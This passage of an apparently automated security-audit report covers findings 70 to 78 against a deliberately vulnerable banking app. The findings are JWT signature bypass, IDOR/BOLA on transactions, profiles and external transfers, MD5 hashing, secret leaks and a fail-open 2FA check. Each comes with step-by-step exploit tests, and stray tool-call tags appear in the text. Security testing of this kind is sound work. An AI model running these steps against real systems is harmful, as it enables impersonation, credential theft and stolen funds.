  "None found: index() shows the codebase already implements an ownership-check pattern (Account::findByIdAndUser) that is simply absent from show(), reinforcing this is a genuine oversight rather than an intentional design choice or dead code path.",
  "Route is reachable in production API (registered in Router.php, not admin-only, not feature-flagged)."
]
```

#### Proof gaps

```
[
  "Did not verify runtime behavior of Response::notFound (e.g., whether it calls exit/die) though it is standard in this codebase pattern (used identically in index()) so control flow to Response::success afterwards is presumed guarded — low risk to conclusion since sibling method uses same pattern successfully.",
  "Did not confirm whether transaction IDs are guaranteed sequential/enumerable in all deployments, but schema uses AUTO_INCREMENT primary key which is the standard MySQL default, making enumeration highly likely regardless."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions/{id}",
    "TransactionController::show()",
    "Transaction::findById() with no from/to account ownership validation against $auth['user']",
    "Cross-customer transaction data disclosed"
  ],
  "impact": "Any authenticated user can enumerate transaction IDs to read other customers' amounts, descriptions, BSB/account numbers, and payee details.",
  "severity_reasoning": "Medium: duplicate IDOR confidentiality issue, no funds movement, requires ID enumeration.",
  "dynamic_test": "As authenticated user, GET /api/transactions/{id} for ids belonging to other customers; confirm details returned without ownership validation."
}
```

#### Validator reasoning

The route GET /api/transactions/{id:\d+} is registered with 'auth' => true, meaning any authenticated user (not admin-only) passes AuthMiddleware::handle() and reaches TransactionController::show($auth, $vars). show() calls Transaction::findById((int)$vars['id']), which executes `SELECT * FROM transactions WHERE id = ?` with no filter on from_account_id/to_account_id/user ownership, then returns the formatted transaction to any caller who supplied a valid numeric id. This is a textbook IDOR: transaction IDs are sequential auto-increment integers (per schema.sql/seed.sql), so an authenticated low-privilege customer can enumerate ids and retrieve other users' transaction records (amounts, descriptions, BSB/account numbers, payee names). The sibling method index() demonstrates the intended access-control pattern in this codebase: when an account_id filter is supplied it calls Account::findByIdAndUser($accountId, $userId) to enforce ownership before querying transactions — show() has no analogous check. There is no secondary check anywhere else in the request path (middleware, model, or Response layer) that ties the returned transaction back to $auth['user']['id']. This is a direct, unauthenticated-within-tenant (broken object-level authorization) vulnerability confirmed by tracing route -> controller -> model -> raw SQL with no ownership predicate.

## 70. JWT signature verification bypassed — full authentication bypass

- Lead reference: PWNJ-070
- Category: A07
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:44
- Fingerprint: 12848562f8620ca00e4dad996163e391cd6481594fc552ecb823831647736853

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:44
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found blocking exploitation: no signature/HMAC verification exists anywhere in AuthService::decodeToken or AuthMiddleware::handle; AdminAuthMiddleware (separate code path for admin panel) does correctly verify signatures but does not protect the user-facing routes gated by AuthMiddleware."
]
```

#### Proof gaps

```
[
  "Did not execute a live exploit against a running instance; verification is static/code-based only, but the vulnerable code path is unambiguous and directly reachable from every 'auth'=>true route with no intervening control."
]
```

#### Attack path

```
{
  "nodes": [
    "External attacker",
    "Craft JWT with arbitrary sub and unverified signature",
    "AuthMiddleware::handle() -> AuthService::decodeToken() (no signature check, unlike AdminAuthMiddleware)",
    "User::findById($payload->sub) returns victim; impersonation granted",
    "Access to profile, accounts, address book, transfers, transactions, FX, insurance SSO"
  ],
  "impact": "Complete authentication bypass allowing impersonation of any user across every AuthMiddleware-protected endpoint, including transaction access and fund transfers.",
  "severity_reasoning": "High: duplicate of the core JWT signature-bypass root cause, critical impact.",
  "dynamic_test": "Craft a JWT with payload {\"sub\":<victim id>,\"jti\":\"x\",\"exp\":<future>} and an arbitrary third segment; use it as Bearer token against GET /api/transactions or any auth=true route; confirm acceptance without valid signature."
}
```

#### Validator reasoning

Reviewed AuthService::decodeToken (lines 50-64), AuthMiddleware::handle(), AdminAuthMiddleware::handle(), and Router.php route table. decodeToken() splits the JWT on '.', base64-decodes only the payload segment, and checks solely the presence/validity of the `exp` claim; it never calls Firebase\JWT\JWT::decode nor performs any HMAC/signature verification against the configured jwt_secret, despite createToken() using JWT::encode with that secret (proving a real signing key exists and is expected to be verified). AuthMiddleware::handle(), which gates every route flagged 'auth' => true in Router.php (profile, accounts, address book, transfers via TransactionController, FX, insurance SSO, logout), calls this decodeToken() directly, then unconditionally trusts $payload->sub to look up the user via User::findById($payload->sub) and returns that user as the authenticated principal — with no independent signature or MAC check anywhere in the path. The only other checks are isTokenRevoked($payload->jti) (a DB lookup keyed by an attacker-controlled jti claim — an attacker simply uses an unused/random jti to avoid any hit) and expiry (also attacker-controlled since the payload is unverified). Contrast is confirmed: AdminAuthMiddleware correctly uses JWT::decode(token, new Key($secret,$alg)) for the admin panel, showing the developer knew the secure pattern but the user-facing AuthService path omits it. This constitutes a complete, unauthenticated impersonation vulnerability: an attacker can construct a 3-part token "header.base64(payload).anything" with payload {"sub":<victim id>,"jti":"<random>","exp":<future>} and be treated as that authenticated user across all sensitive endpoints, including transaction listing/detail and money transfers (transferOwn/transferExternal). No compensating control (WAF rule, additional MAC check, session binding) is present in the reviewed code.</parameter>
<parameter name="controls">["isTokenRevoked() jti blacklist check - ineffective since jti is attacker-controlled and forged tokens simply avoid used jti values", "exp expiry check - ineffective since exp is also attacker-controlled in the unverified payload", "User::findById(payload->sub) existence check - only requires attacker to pick a sub value corresponding to an existing user id, does not prevent impersonation"]

## 71. BOLA: profile update accepts attacker-controlled user_id to modify any account

- Lead reference: PWNJ-071
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:47
- Fingerprint: 73431a1ae91b995561d44afcf7e4873cfb18b421da4b823adf28d93786767541

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:47
```

#### Controls encountered

```
[
  "Router requires 'auth' => true (i.e., caller must be an authenticated user) but performs no ownership/role check",
  "Validator::make() only checks format/length of the profile fields (first_name, email, etc.), not authorization over user_id",
  "Email uniqueness check queries against the authenticated user's own email, not the target's, so does not prevent the BOLA path"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify runtime DB schema/User::update implementation for secondary filtering (unlikely to block based on read), but User::update signature (int $id, array $data) in Models/User.php indicates straightforward update by primary key with no ownership filter"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "PUT /api/profile with attacker-controlled user_id in body",
    "ProfileController::update() -> targetUserId = data['user_id']",
    "User::update($targetUserId, ...) modifies target's fields; User::findById()+toPublic() returns target's profile",
    "Attacker receives and can further modify victim's PII"
  ],
  "impact": "Any authenticated user can modify and disclose the full profile of any other account by supplying an arbitrary user_id, enabling PII disclosure and unauthorized modification.",
  "severity_reasoning": "High: BOLA enabling both disclosure and modification of arbitrary account PII.",
  "dynamic_test": "As authenticated user, PUT /api/profile with {\"user_id\":<victim>, \"first_name\":\"Attacker\"}; then separately confirm the response returns the victim's full profile (email, phone, address)."
}
```

#### Validator reasoning

ProfileController::update() is routed at PUT /api/profile with only generic auth middleware (Router.php:47, 'auth' => true) — no ownership or role check is applied by the router. Inside the handler, $targetUserId is derived directly from attacker-controlled JSON body field user_id ($data['user_id']) rather than always using the authenticated $auth['user']['id']. This targetUserId is passed unchecked into User::update($targetUserId, $updateData) and User::findById($targetUserId), whose result (including PII: email, phone, address) is returned in the response. There is no code anywhere in the method that validates $targetUserId === $user['id'] or checks any admin/elevated role before allowing a different id. The email-uniqueness check compares $data['email'] to $user['email'] (the authenticated user), not the target user, so it doesn't block the cross-account path either. This gives a full source (attacker-controlled request body) to sink (privileged update/read of arbitrary user record) path with no intervening control, matching a classic BOLA/IDOR pattern. Any authenticated low-privilege user can supply an arbitrary user_id to modify another account's profile fields and read back that account's PII.

## 72. Sensitive fields (password_hash, totp_secret) exposed in profile API responses

- Lead reference: PWNJ-072
- Category: API3
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:66
- Fingerprint: 245a464eca3e1f373b8e28358d51f10ac86a245a80521de28a861b67f677c26f

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/User.php:66
```

#### Controls encountered

```
[
  "Route requires 'auth' => true (valid session/authentication) but this only proves identity, not authorization over the target resource",
  "Validator::make() validates format of first_name/last_name/email/phone/address fields but does not validate or restrict 'user_id' or block the update()/toPublic() call when only user_id is supplied"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "show() alone does not have a BOLA vector; it always returns the authenticated user's own record, so sensitive-field exposure via GET /api/profile only affects self-disclosure of one's own password_hash/totp_secret (still a bad practice but lower severity in isolation)"
]
```

#### Proof gaps

```
[
  "Did not execute the application end-to-end to observe an actual HTTP response body, relying on static code-path reconstruction from Router.php, ProfileController.php, and User.php",
  "Did not verify whether any WAF/API-gateway-level response filtering or a separate serialization middleware might strip these fields before reaching the client, though no such component was found in the reviewed source"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker exploits BOLA (user_id in body)",
    "ProfileController::show()/update() calls User::toPublic()",
    "toPublic() includes password_hash and totp_secret fields",
    "Attacker obtains victim's password hash and TOTP secret",
    "Offline password cracking / TOTP code generation defeats 2FA"
  ],
  "impact": "Combined with the profile BOLA, any attacker can retrieve another user's password hash and raw TOTP secret, enabling offline cracking and full 2FA bypass.",
  "severity_reasoning": "High: chainable with BOLA to yield full credential and 2FA compromise for arbitrary victims.",
  "dynamic_test": "Combine with the BOLA finding: PUT /api/profile {\"user_id\":<victim>} then GET the response body and confirm it includes victim's password_hash and totp_secret."
}
```

#### Validator reasoning

Reviewed User::toPublic() in BankOfEd-main/src/Models/User.php:66-81 and confirmed it unconditionally returns 'password_hash' and 'totp_secret' from the raw $user array alongside public profile fields, with no redaction/omission logic. Reviewed ProfileController::show() (GET /api/profile) which calls Response::success(User::toPublic($auth['user'])) directly, so every authenticated caller receives their own password_hash and totp_secret in the API response — already a violation of least-exposure serialization design even for self.

More critically, ProfileController::update() (PUT /api/profile) computes $targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'] directly from attacker-supplied JSON body with no ownership/authorization check against the authenticated user. It then unconditionally calls User::findById($targetUserId) and returns Response::success(User::toPublic($updated), ...) — this happens even if $updateData is empty (i.e., the attacker doesn't need to actually modify anything, just supply user_id to pivot). Router.php confirms the route only requires 'auth' => true (any valid authenticated session), with no per-resource authorization check performed anywhere in the request pipeline for this endpoint.

This gives a concrete, unauthenticated-boundary-crossing (BOLA) path: any authenticated user can PUT /api/profile with body {"user_id": <victim_id>} and receive the victim's full profile including password_hash (enabling offline cracking) and totp_secret (enabling 2FA bypass by generating valid codes), since TotpService::verify uses this same secret value elsewhere in the codebase. There is no field allow-list at the serialization boundary, no per-user authorization check on the update handler, and no other middleware layer that intercepts or filters the response body. The source-to-sink path is fully traceable in-repo with no blocking control found.

## 73. Weak password hashing algorithm (MD5) for legacy accounts

- Lead reference: PWNJ-073
- Category: A02
- Severity: MEDIUM
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:23
- Fingerprint: 2d817668898949eb86a264c399cf57d8f5110308495015fed8d7ff39789b83b3

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:23
```

#### Controls encountered

```
[
  "None – no salting, no adaptive hashing, no migration path enforcing bcrypt for new registrations"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Admin accounts (AdminAuthController/AdminUserController) correctly use password_hash()/PASSWORD_BCRYPT and password_verify(), showing the codebase has the secure primitive available but simply doesn't use it for the standard user registration/login flow.",
  "verifyPassword() does support bcrypt hashes for hash lengths != 32, so if a password_hash column were ever migrated to bcrypt for a user, verification would still work — but no such migration is present in this codebase (register() only ever writes MD5)."
]
```

#### Proof gaps

```
[
  "No evidence of an actual password-hash disclosure vector was independently re-verified in this session (the description references 'unauthenticated export endpoint' and 'SQL injection findings' from other candidates); however, exploitability does not strictly require a disclosure bug to exist — weak hashing is a storage-at-rest weakness that materializes risk whenever any disclosure occurs (backup theft, insider, future SQLi, etc.), which is sufficient for an A02 finding regardless of whether another concurrent vulnerability provides the disclosure vector."
]
```

#### Attack path

```
{
  "nodes": [
    "Any vector disclosing users.password_hash (SQLi, unauthenticated export, toPublic leak)",
    "AuthService::hashPassword() = md5($password), no salt",
    "AuthService::verifyPassword() still accepts 32-char md5 hashes",
    "Attacker rainbow-table/brute-forces MD5 hash to recover plaintext password",
    "Attacker logs in as victim with recovered credentials"
  ],
  "impact": "Unsalted MD5 password hashing means any database or hash disclosure (via SQLi, unauthenticated export, or toPublic leak) yields rapidly crackable plaintext passwords for all users.",
  "severity_reasoning": "Medium: weak cryptographic control that amplifies impact of any other data-exposure finding into full credential compromise.",
  "dynamic_test": "Register a test account, retrieve its password_hash via GET /api/profile (leaked per toPublic finding), and confirm hash length is 32 hex chars matching md5(password); crack it with a standard MD5 rainbow table/tool to recover the plaintext."
}
```

#### Validator reasoning

AuthService::hashPassword() (AuthService.php:22-25) returns raw md5($password) with no salt, and this is directly invoked by AuthController::register() (POST /api/auth/register) when creating every new user's password_hash column. AuthService::verifyPassword() explicitly special-cases 32-character hashes to compare via md5(), meaning any account whose password_hash is 32 chars (i.e., every account created via register()) is verified using unsalted MD5 rather than bcrypt. This is not a legacy/dead code path guarded off — it is the sole hashing routine used by the primary user registration/login flow. AdminUserController and AdminAuthController use password_hash()/PASSWORD_BCRYPT and password_verify() for admin accounts only; that is a separate, unrelated code path and does not mitigate the customer-facing registration flow. There is no salting, no work-factor, and MD5 is cryptographically broken/fast, making offline brute force, rainbow-table lookups, and credential stuffing straightforward if the users table or password_hash column is ever disclosed (e.g., backup leak, other injection finding, insider access). This satisfies OWASP A02 (Cryptographic Failures) criteria for insecure password storage with a concrete, reachable source-to-storage path: user-controlled password in POST /api/auth/register -> AuthService::hashPassword() -> md5() -> User::create() -> users.password_hash column.

## 74. Unauthenticated /api/health leaks JWT signing secret and DB credentials

- Lead reference: PWNJ-074
- Category: A05
- Severity: HIGH
- Confidence: 85%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:24
- Fingerprint: 34b9f7a649ab1f080c5f339c45c92611869f0bd794fbad32b9be7b0dbe074364

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:24
```

#### Controls encountered

```
[
  "None: 'auth' => false explicitly skips both AuthMiddleware and MachineAuthMiddleware in Router::dispatch()'s switch/if-elseif chain."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "AdminAuthMiddleware loads config/admin.php and validates against a distinct 'ADMIN_JWT_SECRET'-derived secret (different default value from app.php's jwt_secret), so the leaked app.php jwt_secret cannot be used to forge admin JWTs as the description claims.",
  "InsuranceService::generateSsoToken() signs SSO tokens with config['insurance_sso_secret'] (env INSURANCE_SSO_SECRET, distinct default), not config['jwt_secret'], so the leaked secret cannot be used to forge insurance SSO tokens as the description claims."
]
```

#### Proof gaps

```
[
  "Whether JWT_SECRET/ADMIN_JWT_SECRET/INSURANCE_SSO_SECRET are actually set to distinct non-default values in a real deployment (.env) was not verifiable from static code alone, though the code structure guarantees they are logically separate secrets regardless of value.",
  "Did not verify whether AuthService::decodeToken() performs additional binding (e.g., issuer/audience checks) beyond signature verification that might partially mitigate forged standard-user tokens; only confirmed it uses the leaked app.php jwt_secret for HS256 verification."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health() returns db_host, db_name, db_user, jwt_secret",
    "Attacker forges admin JWT with iss=BankOfEdAdmin using leaked secret",
    "AdminAuthMiddleware verifies and accepts forged admin token"
  ],
  "impact": "Public disclosure of jwt_secret enables forging both customer and admin JWTs (shared secret with AdminAuthMiddleware) and insurance SSO tokens.",
  "severity_reasoning": "High: unauthenticated leak of a secret shared across customer and admin trust boundaries, enabling admin-level compromise.",
  "dynamic_test": "curl -s https://target/api/health unauthenticated; confirm jwt_secret/db_* returned; forge an admin JWT using this secret (since AdminAuthMiddleware verifies with the same value) and confirm acceptance on an admin endpoint."
}
```

#### Validator reasoning

The core finding is verified by direct code inspection. Router::dispatch() registers `GET /api/health` with `'auth' => false`, and the dispatch switch statement only invokes AuthMiddleware::handle() or MachineAuthMiddleware::handle() when the route's auth flag is `true` or `'machine'` respectively; for `false` no middleware runs and Router::health() is called directly with no authentication or authorization check. Router::health() loads config/app.php and returns db_host, db_name, db_user, and jwt_secret verbatim in the JSON response body via Response::success(), so any unauthenticated caller can retrieve these secrets.

The leaked `jwt_secret` (config/app.php, env var JWT_SECRET, default 'bankofed-dev-secret-change-in-production') is the exact secret used by AuthService::decodeToken()/AuthService's token generation (used by AuthMiddleware), which protects the majority of normal user endpoints (/api/profile, /api/accounts, /api/transfers, /api/transactions, etc). Anyone possessing this secret can forge a validly-signed JWT for AuthMiddleware and impersonate arbitrary users (specify any `sub`, `jti` if revocation lookups don't block it), constituting an authentication bypass. DB host/name/user disclosure is also a legitimate (lower-severity) secondary leak.

However, two specific claims in the description are inaccurate and were disproved: (1) AdminAuthMiddleware does NOT use app.php's jwt_secret — it loads config/admin.php and uses a separate `ADMIN_JWT_SECRET`-derived secret with a different default value, so leaking app.php's jwt_secret does not let an attacker forge admin JWTs as claimed. (2) InsuranceService does not sign SSO tokens with app.php's jwt_secret either — it uses a distinct `insurance_sso_secret` config key (env INSURANCE_SSO_SECRET) with its own different default, so the "forging insurance SSO tokens" claim is also incorrect. These are separate secrets in separate config files, so the "cascading admin/insurance compromise" narrative in the description does not hold as written.

Despite these overstatements, the fundamental vulnerability — an unauthenticated endpoint leaking the primary application JWT secret and DB connection details, enabling forgery of regular-user auth tokens — is real, directly reachable, and unmitigated by any control in the code path. This still merits a high-severity confirmed finding, though the exact blast-radius description should be corrected to reflect that only standard user-session JWTs (not admin or insurance SSO tokens) are forgeable with this specific leaked secret.

## 75. Internal exception details (stack trace, file path) leaked to API clients

- Lead reference: PWNJ-075
- Category: A05
- Severity: MEDIUM
- Confidence: 88%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/index.php:26
- Fingerprint: 68bfe26e07bb81828d80fb97f25d15a5b9147098cc14695af3ee90e2790e2637

### Evidence Chain

#### Source

```
BankOfEd-main/public/index.php:26
```

#### Controls encountered

```
[
  "[\"Some individual controllers/services (AccountController, PaymentController, TransferService, AuthService, AdminAuthMiddleware, Setting model) catch their own exceptions and return sanitized errors, reducing the surface that reaches this global handler, but do not eliminate it since not all controllers/paths do this.\"]\n<parameter name=\"counterevidence\">[\"No APP_ENV/APP_DEBUG conditional found anywhere in the codebase gating error verbosity, contradicting any assumption that this is dev-only behavior.\", \"Router::health() APP_ENV usage is unrelated to error detail suppression, confirming no environment-based control exists for this sink.\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No concrete PoC request/payload was executed to trigger a real uncaught Throwable in a live environment; reachability is inferred from code structure (unmatched routes, DB errors, malformed input) rather than an observed runtime trace.",
  "Exact frequency/ease of triggering an uncaught exception pre-auth (e.g., specific malformed request causing a TypeError) was not enumerated exhaustively."
]
```

#### Attack path

```
{
  "nodes": [
    "Any caller (including unauthenticated) triggering an uncaught exception",
    "public/index.php global try/catch around Router::dispatch()/AdminRouter::dispatch()",
    "Response::error() echoes exception message, file, line, and full trace as JSON",
    "Attacker gains internal path disclosure and potential sensitive data from exception messages"
  ],
  "impact": "Leaked internal file paths and stack traces (potentially including SQL fragments/parameters) aid attackers in reconnaissance and refining further exploitation, reachable even pre-authentication.",
  "severity_reasoning": "Medium: information disclosure aiding further attacks, not directly exploitable for takeover but weakens defense-in-depth.",
  "dynamic_test": "Trigger a server error (e.g. malformed request causing a PDO exception) before authentication is checked; inspect the JSON error response for file path, line number, and full stack trace."
}
```

#### Validator reasoning

public/index.php wraps the entire API dispatch (both Router::dispatch and AdminRouter::dispatch) in a single try/catch(\Throwable). On any uncaught exception it calls Response::error('INTERNAL_ERROR', $e->getMessage(), 500, ['file'=>..., 'line'=>..., 'trace'=>...]). Response::error (src/Helpers/Response.php) unconditionally merges the $details array into the JSON error payload whenever it is non-empty — there is no environment/APP_DEBUG/APP_ENV gate anywhere in this code path (confirmed by grepping the whole tree: the only APP_ENV usage is Router::health() reporting the environment name, not gating error verbosity). Because the try/catch sits at the very top of index.php, before any auth middleware executes inside Router::dispatch/AdminRouter::dispatch, an unauthenticated caller who triggers any uncaught Throwable (a PDOException from a DB error, a TypeError from malformed input, an unmatched-route dispatcher exception, etc.) will receive the raw exception message, absolute file path, line number, and full stack trace in the JSON response. This is a real, unconditional information-disclosure sink with no compensating control visible in the reviewed code. Severity is appropriately medium (info leak, not direct compromise), and note several controllers/services do catch their own \Throwable/\Exception internally (AccountController, PaymentController, TransferService, AuthService, AdminAuthMiddleware) which reduces frequency of triggering this specific path, but does not eliminate it — many code paths (route-not-found handling inside FastRoute dispatch, DB connection failures, unguarded controllers) remain unguarded and will still bubble up to this global handler.

## 76. Passwords hashed with unsalted MD5

- Lead reference: PWNJ-076
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:24,29-32
- Fingerprint: fc5335977364579db67616631d5361ce41ed92dcaa38a06bf057a1bf3b1be613

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:24,29-32
```

#### Controls encountered

```
[
  "Validator::make enforces password length 1-128 and presence, but does not affect hashing algorithm choice",
  "AdminUserController and deploy.sh correctly use bcrypt for admin/user password resets, showing bcrypt is available in the codebase but not used in the primary registration flow"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Weakness only materializes if the password_hash database column is exposed via a separate compromise (e.g., SQLi, backup leak) — it does not by itself grant remote code execution or direct authentication bypass",
  "AdminAuthController for admin login already uses password_verify with bcrypt, so the admin surface is unaffected"
]
```

#### Proof gaps

```
[
  "Did not independently verify runtime behavior (e.g., whether config disables registration or whether MD5 module is stripped in some deploy profile), but source code shows no conditional guarding this call, so this gap is minimal"
]
```

#### Attack path

```
{
  "nodes": [
    "User registers via AuthController::register",
    "AuthService::hashPassword() = md5($password) with no salt",
    "Hash stored in users.password_hash",
    "Any DB disclosure vector (SQLi, unauthenticated export) yields hash",
    "Attacker cracks MD5 hash via rainbow table/GPU brute force"
  ],
  "impact": "Every current account's password is stored as an unsalted MD5 hash, trivially crackable if the database is ever exposed, undermining credential confidentiality bank-wide.",
  "severity_reasoning": "High per candidate: cryptographically broken hashing scheme applied to all accounts, severe long-term confidentiality risk once combined with any DB exposure.",
  "dynamic_test": "Register a new user; obtain password_hash via any disclosure vector (toPublic leak, SQLi, export endpoint); verify it's a 32-character MD5 digest of the known password, and crack it trivially with a rainbow table."
}
```

#### Validator reasoning

Verified end-to-end: AuthController::register() (bound to POST /api/auth/register) takes user-supplied password from JSON body, validates only length/presence (min:1|max:128), and calls AuthService::hashPassword($data['password']), which is implemented as a bare `return md5($password);` — no salt, no iteration, no modern KDF. The resulting 32-character hex digest is stored directly as users.password_hash via User::create(). AuthService::verifyPassword() confirms this is not incidental: it explicitly branches on strlen($hash) === 32 to treat any such hash as legacy MD5 and compares with md5($password) === $hash, while only falling back to password_verify() for non-32-char (bcrypt) hashes. This is a real, currently-active code path for all new registrations, not dead/legacy-only code — every account created via /api/auth/register today receives an unsalted MD5 hash. Other parts of the codebase (deploy.sh, AdminUserController::changePassword) correctly use password_hash()/PASSWORD_BCRYPT for admin accounts and admin-initiated user password resets, confirming the project knows the correct practice but never applies it to the primary self-registration path. There is no salting, peppering, or rate-limiting mitigation visible in AuthController::register or AuthService that would neutralize the weakness of MD5 (trivial GPU/rainbow-table cracking) if the password_hash column were ever exposed (e.g., via a SQL injection dump or backup leak). This is a legitimate, exploitable-if-DB-exposed cryptographic storage weakness (CWE-916 / CWE-327), matching CWE-A02 (Cryptographic Failures).

## 77. IDOR: transferExternal() debits any account by ID with no ownership check

- Lead reference: PWNJ-077
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:172-176
- Fingerprint: eca1ec5da37cb332d5b166ba655141e0db8cd79b6ef403138bbe72d5561a665e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/TransferService.php:172-176
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify Account::findById() model implementation to rule out an unexpected implicit user filter, but the explicit contrast with findByIdAndUser() and the developer's own vulnerability comment strongly indicate no such filter exists",
  "Did not trace the full routing/middleware configuration file to fully rule out an upstream authorization middleware, but no such control is referenced anywhere in the code or comments, and the analogous transferOwn() method demonstrates the intended fix pattern is absent here"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "POST /api/transfers/external {from_account_id:<victim>, to_bsb, to_account_number}",
    "TransactionController::transferExternal -> TransferService::transferExternal()",
    "Account::findById($fromAccountId) - no ownership check (comment: VULNERABILITY #23)",
    "Account::updateBalance($fromAccountId, '-'.$debitAmount) debits victim's account",
    "Funds sent to attacker-controlled destination"
  ],
  "impact": "Theft of funds from any customer's account via IDOR on the source-account check in transferExternal, an acknowledged vulnerability in the code itself.",
  "severity_reasoning": "High: direct, acknowledged theft-of-funds vulnerability with critical financial impact.",
  "dynamic_test": "As authenticated attacker, POST /api/transfers/external with from_account_id set to a victim's account id (discoverable via IDOR) and destination BSB/account attacker controls; confirm funds debited from victim."
}
```

#### Validator reasoning

The candidate is fully substantiated by the code. TransactionController::transferExternal() decodes the JSON body, validates only that from_account_id is numeric (no ownership check at the controller level), and passes the client-supplied from_account_id directly to TransferService::transferExternal($auth['user'], (int)$data['from_account_id'], ...). Inside TransferService::transferExternal (lines ~172-176), the source account is fetched with Account::findById($fromAccountId) — a lookup that does not filter by the authenticated user's ID — in contrast to transferOwn(), which explicitly calls Account::findByIdAndUser($fromAccountId, $userId) to enforce ownership. The comment in the source itself flags this as 'VULNERABILITY #23: IDOR'. After the account is found, the code proceeds to determine currency, resolve payee (address book or manual BSB/account), and unconditionally executes Account::updateBalance($fromAccountId, '-' . $debitAmount) inside a DB transaction, debiting the victim account and sending funds to an address/BSB fully controlled by the attacker (address_book_id owned by attacker, or arbitrary to_bsb/to_account_number). There is no balance check either (further flagged as VULNERABILITY #9, unrelated but compounding). No middleware layer, no authorization decorator, and no re-validation elsewhere in the trace re-introduces an ownership check. The endpoint requires authentication (via $auth) but authentication is not authorization for the specific target account — any authenticated user can supply an arbitrary victim account ID. This is a concrete, complete source (client JSON body from_account_id) to sink (Account::updateBalance debiting arbitrary account) path with no effective blocking control.</reasoning>
<parameter name="controls">["Route requires authentication (valid session/JWT) to reach transferExternal, but this only proves identity, not authorization over the specific source account", "TOTP/2FA check exists but only gates authorization of the *transfer action* type, not ownership of the debited account, and can be bypassed entirely if the victim hasn't configured TOTP (per VULNERABILITY #8 comment)"]

## 78. TOTP/2FA bypass: external transfers proceed without TOTP when user has not enabled 2FA

- Lead reference: PWNJ-078
- Category: A07
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:238-247
- Fingerprint: 8f2d8fee56f671e40f90a88afd8c62abd43d4d5bf59c0b16dd6cb039877efb5e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/TransferService.php:238-247
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute end-to-end integration test against a live instance to observe HTTP response/DB state, relying on static code reading of the exact fail-open branch and absence of downstream gating logic"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (2FA not enabled, or omits totp_code)",
    "POST /api/transfers/external to new/manual payee",
    "TransferService::checkTotpRequired() flags transfer as TOTP-required",
    "transferExternal(): if !user['totp_enabled'] -> totpVerified=false, transfer proceeds anyway",
    "or if totp_enabled but totp_code empty -> elseif branch skipped, transfer still proceeds",
    "Transfer executes without any second-factor verification"
  ],
  "impact": "External transfers that should require a second factor complete without any TOTP verification when the user has not enabled 2FA or simply omits the code, defeating the entire 2FA control for high-value/new-payee transfers, compounding the source-account IDOR into unauthenticated-2FA fraud.",
  "severity_reasoning": "High: fail-open design on a fraud-prevention control for financial transactions, enabling unauthorized/undetected transfers.",
  "dynamic_test": "As an attacker account with totp_enabled=false (or with totp_enabled=true but omitting totp_code), initiate an external transfer to a new payee requiring TOTP per checkTotpRequired(); confirm the transfer completes successfully without providing any valid TOTP code."
}
```

#### Validator reasoning

Reviewed TransferService::transferExternal (lines ~158-311) and its caller TransactionController::transferExternal. The code exactly matches the described flaw:

1. checkTotpRequired() correctly flags 'manual' transfers and first-time (unverified) address-book payees as requiring TOTP (required=true).
2. In transferExternal(), $totpVerified is initialized to false.
3. The enforcement block is:
   if ($totpCheck['required']) {
       if (!$user['totp_enabled']) { $totpVerified = false; }         // fail-open: no TOTP configured -> proceed anyway
       elseif (!empty($totpCode)) { verify or Response::forbidden(); $totpVerified = true; }
       // else: totp_enabled=true but totpCode empty/null -> falls through, no verification, no rejection
   }
4. Nothing after this block checks $totpVerified before executing the transfer — the code proceeds directly to balance debit/credit and Transaction::create() regardless of $totpVerified's value. $totpVerified is only recorded as metadata (totp_verified column) and used later solely to decide whether to mark an address-book entry verified.
5. TransactionController::transferExternal has no independent enforcement: it validates only structural fields (from_account_id, amount, bsb/account_number/address_book_id) via Validator::make and does not require totp_code to be present, nor does it re-check totp_enabled/totp_code before calling the service. $data['totp_code'] ?? null is passed straight through, so omitting the field entirely reproduces the same bypass.
